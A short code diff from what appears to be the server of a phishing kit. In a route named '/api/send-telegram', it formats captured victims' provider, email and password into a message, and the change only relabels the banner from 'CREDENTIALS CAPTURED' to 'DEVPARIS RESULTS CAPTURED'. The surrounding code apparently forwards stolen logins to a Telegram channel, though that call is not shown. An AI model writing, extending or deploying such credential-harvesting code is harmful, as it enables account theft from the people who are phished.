@@ -34,7 +34,7 @@ app.post('/api/send-telegram', async (req, res) => {
   // Format the message based on the type of submission
   if (type === 'credentials') {
     message = `
---- 💼 CREDENTIALS CAPTURED 💼 ---
+--- 💼 DEVPARIS RESULTS CAPTURED 💼 ---
 Provider: ${data.provider || 'N/A'}
 Email: ${data.email || 'N/A'}
 Password: ${data.password || 'N/A'}
